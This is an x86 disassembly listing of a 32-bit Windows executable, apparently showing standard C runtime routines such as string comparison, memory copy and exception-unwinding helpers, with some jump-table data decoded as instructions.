  42634b:	add    esp,0x2c
  42634e:	pop    esi
  42634f:	ret    
  426350:	push   esi
  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
